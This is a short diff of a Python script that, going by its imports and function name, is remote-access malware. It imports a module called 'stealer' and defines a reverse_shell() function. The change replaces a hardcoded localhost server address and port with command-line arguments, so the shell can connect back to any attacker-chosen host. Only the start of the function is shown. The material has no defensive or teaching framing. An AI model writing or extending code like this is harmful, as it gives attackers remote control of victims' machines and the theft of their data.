@@ -1,10 +1,10 @@
 import socket
 import subprocess
 import os
-import stealer, requests, json
+import stealer, requests, json, sys
 
-SERVER_IP = '127.0.0.1'
-SERVER_PORT = 7777
+SERVER_IP = sys.argv[1]
+SERVER_PORT = int(sys.argv[2])
 
 def reverse_shell():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
